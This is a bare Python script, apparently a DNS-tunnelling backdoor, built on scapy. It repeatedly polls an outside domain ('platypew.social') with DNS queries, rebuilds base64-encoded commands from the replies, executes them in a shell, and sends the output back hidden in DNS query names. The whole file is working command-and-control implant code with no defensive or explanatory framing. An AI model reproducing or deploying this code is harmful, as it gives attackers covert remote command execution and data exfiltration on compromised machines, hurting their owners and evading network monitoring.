#! /usr/bin/env python3

from scapy.all import DNS, DNSQR, IP, UDP, sr, sr1
from base64 import b64encode, b64decode
from random import randint
from time import sleep

import subprocess
import threading

DOMAIN = "platypew.social"
IFACE = "eth0"
INTERVAL = 0.01
PULSE = 1

FRAG_LEN = 70 - len(DOMAIN)

recv = b""


def execute(cmd: bytes) -> bytes:
    out, err = subprocess.Popen([cmd], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                shell=True).communicate()

    if out:
        return out
    else:
        return err


def pulse() -> None:
    global recv
    while True:
        ip = IP(dst=f"www.{DOMAIN}")
        udp = UDP(dport=53)
        dns = DNS(id=randint(0x0, 0xffff), rd=1, qr=0, qd=DNSQR(qname=f"pulse.{DOMAIN}", qtype="A"))
        beat = ip / udp / dns

        res = sr1(beat, iface=IFACE, verbose=False)

        data = res.an.rrname.split(f".{DOMAIN}".encode())[0]

        if data != b"pulse":
            recv += data

            if res[DNS].z == 1:
                cmd = decode(recv)
                print(cmd.decode())
                send_data(execute(cmd))
                recv = b""

        sleep(PULSE)


def encode(data: bytes) -> list:
    data = data.strip()
    e_data = b64encode(data).decode()
    frag_e_data = [e_data[i:i + FRAG_LEN] for i in range(0, len(e_data), FRAG_LEN)]
    return frag_e_data


def decode(data: bytes) -> bytes:
    data = b64decode(recv)
    return data


def send_data(data: bytes) -> None:
    frag_e_data = encode(data)

    req = []
    for i, data in enumerate(frag_e_data):
        ip = IP(dst=f"www.{DOMAIN}")
        udp = UDP(dport=53)
        dns = DNS(id=randint(0x0, 0xffff),
                  rd=1,
                  qr=0,
                  qd=DNSQR(qname=f"{data}.{DOMAIN}", qtype="A"))

        if i + 1 == len(frag_e_data):
            dns.z = 1

        req.append(ip / udp / dns)

    return sr(req, inter=INTERVAL, iface=IFACE, verbose=False)


def main():
    threading.Thread(target=pulse).start()


if __name__ == "__main__":
    main()
